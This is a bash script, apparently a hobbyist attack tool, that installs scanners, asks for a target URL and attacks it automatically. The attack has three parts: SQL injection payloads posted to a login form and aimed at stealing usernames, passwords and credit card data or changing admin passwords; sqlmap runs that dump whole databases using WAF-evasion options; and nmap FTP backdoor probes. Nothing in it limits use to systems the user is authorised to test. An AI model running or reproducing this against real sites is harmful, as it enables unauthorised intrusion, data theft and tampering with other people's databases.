#!/bin/bash

# Author information
echo "by @Hagg4r"

# Function to run a command and return its output
run_command() {
    "$@" 2>&1
}

# Function to run a command with sudo and return its output
run_sudo_command() {
    sudo "$@" 2>&1
}

# Function to save data to a file
save_to_file() {
    local filepath="$1"
    local data="$2"
    echo "$data" >> "$filepath"
}

# Function to install necessary tools if not already installed
install_tools() {
    declare -A tools=(
        ["uniscan"]="uniscan"
        ["nmap"]="nmap"
        ["sqlmap"]="sqlmap"
        ["whois"]="whois"
        ["subfinder"]="subfinder"
        ["seclists"]="seclists"
    )
    
    for tool in "${!tools[@]}"; do
        echo "Checking if $tool is installed..."
        if ! command -v "$tool" &> /dev/null; then
            echo "$tool not found. Installing $tool..."
            run_sudo_command apt-get install -y "${tools[$tool]}"
        else
            echo "$tool is already installed."
        fi
    done
}

# Function to clear the terminal screen
clear_screen() {
    clear
}

# Function to print the animated header
print_header() {
    local colors=('\033[91m' '\033[93m' '\033[92m' '\033[94m' '\033[95m' '\033[96m')
    local header="
     __  .__   __.   ______  __    __   __          ___   .___________.  ______   .______      
|  | |  \\ |  |  /      ||  |  |  | |  |        /   \\  |           | /  __  \\  |   _  \\     
|  | |   \\|  | |  ,----'|  |  |  | |  |       /  ^  \\ `---|  |----`|  |  |  | |  |_)  |    
|  | |  . \`  | |  |     |  |  |  | |  |      /  /_\\  \\    |  |     |  |  |  | |      /     
|  | |  |\\   | |  \`----.|  \`--'  | |  \`----./  _____  \\   |  |     |  \`--'  | |  |\\  \\----.
|__| |__| \\__|  \\______| \\______/  |_______/__/     \\__\\  |__|      \\______/  | _| \`._____|
    "
    for color in "${colors[@]}"; do
        echo -e "$color$header"
        sleep 0.5
        clear_screen
    done
    echo -e "\033[0m"  # Reset color to default
}

# Function to check if the website is accessible
check_website_status() {
    local url="$1"
    if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q "200"; then
        echo "The website $url is accessible."
        return 0
    else
        echo "The website $url is not accessible."
        return 1
    fi
}

# Function to perform SQL Injection, including attempts to bypass Cloudflare
perform_sql_injection() {
    local target_url="$1"
    local results_dir="$2"
    local payloads=(
        "' OR 1=1 --"
        "' OR '1'='1' --"
        "' OR '1'='1'/*"
        "' OR '1'='1'#"
        "' OR 1=1 UNION SELECT 1,2,3 --"
        "' OR 1=1 UNION SELECT NULL, NULL, NULL --"
        "' OR 1=1 UNION SELECT username, password FROM users --"
        "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns --"
        "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --"
        "' OR 1=1 UNION SELECT email FROM users --"
        "' OR 1=1 UNION SELECT password FROM users --"
        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --"
        "SELECT * FROM users WHERE username='admin';"
        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');"
        "UPDATE users SET password='newpassword' WHERE username='admin';"
        "DELETE FROM users WHERE username='olduser';"
        "SELECT * FROM products WHERE name LIKE '%user_input%';"
        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;"
        "SELECT * FROM users WHERE username='user_input' AND password='password_input';"
        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';"
        "SELECT * FROM products WHERE name LIKE '%user_input%';"
        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
        "-- -"
        "-- /*"
        "-- #"
        "/*!*/"
        "OR 1=1"
        "OR 'a'='a'"
        "OR 'a'='a' --"
        "OR 'a'='a' /*"
        "OR 'a'='a' #"
        "OR 'a'='a' /*!' OR 'a'='a'"
    )
    
    local file_count=1
    for payload in "${payloads[@]}"; do
        local data="username=admin${payload}&password=password"
        local response
        response=$(curl -s -d "$data" -X POST "$target_url")
        local output_file="$results_dir/sql_injection_${file_count}.txt"
        save_to_file "$output_file" "$response"
        echo "Saved SQL Injection results to $output_file"
        ((file_count++))
    done
}

# Function to perform a SQLmap scan
perform_sqlmap_scan() {
    local target_url="$1"
    local results_dir="$2"
    local cookies
    read -p "Enter the cookies (if any): " cookies
    
    local commands=(
        "--dbs"
        "--tables"
        "--columns"
        "--dump"
        "--batch"
        "--level=5 --risk=3"
        "--technique=U"
        "--technique=T"
        "--passwords"
        "--users"
        "--current-user"
        "--current-db"
        "--is-dba"
        "--roles"
        "--privileges"
        "--fingerprint"
    )
    
    local file_count=1
    for command in "${commands[@]}"; do
        local result
        if [ -z "$cookies" ]; then
            result=$(run_command sqlmap -u "$target_url" $command --random-agent --tamper=between --identify-waf)
        else
            result=$(run_command sqlmap -u "$target_url" --cookie="$cookies" $command --random-agent --tamper=between --identify-waf)
        fi
        local output_file="$results_dir/sqlmap_scan_${file_count}.txt"
        save_to_file "$output_file" "$result"
        echo "Saved SQLmap scan results to $output_file"
        ((file_count++))
    done
}

# Function to perform an FTP scan
perform_ftp_scan() {
    local target_url="$1"
    local results_dir="$2"
    local file_count=1
    local result
    result=$(run_command nmap -p 21 --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 "$target_url")
    local output_file="$results_dir/ftp_scan_${file_count}.txt"
    save_to_file "$output_file" "$result"
    echo "Saved FTP scan results to $output_file"
    ((file_count++))
}

# Placeholder function to access seclists database
access_seclists() {
    echo "Seclists database accessed successfully."
}

# Main function to orchestrate the security scans
main() {
    install_tools
    
    # Clear the screen and print the header
    clear_screen
    print_header
    
    # Check if the website is accessible
    read -p "Enter the target URL: " target_url
    if ! check_website_status "$target_url"; then
        echo "Exiting script. Please ensure the website is accessible and try again."
        exit 1
    fi
    
    # Create a directory to save results
    local results_dir="scan_results"
    mkdir -p "$results_dir"
    
    # Perform SQL Injection
    echo "Performing SQL Injection..."
    perform_sql_injection "$target_url" "$results_dir"
    
    # Perform SQLmap scan
    echo "Performing SQLmap scan..."
    perform_sqlmap_scan "$target_url" "$results_dir"
    
    # Perform FTP scan
    echo "Performing FTP scan..."
    perform_ftp_scan "$target_url" "$results_dir"
    
    # Access Seclists database
        # Access Seclists database
    echo "Accessing Seclists database..."
    access_seclists
    
    echo "Security scans completed. Results have been saved in the $results_dir directory."
}

# Run the main function
main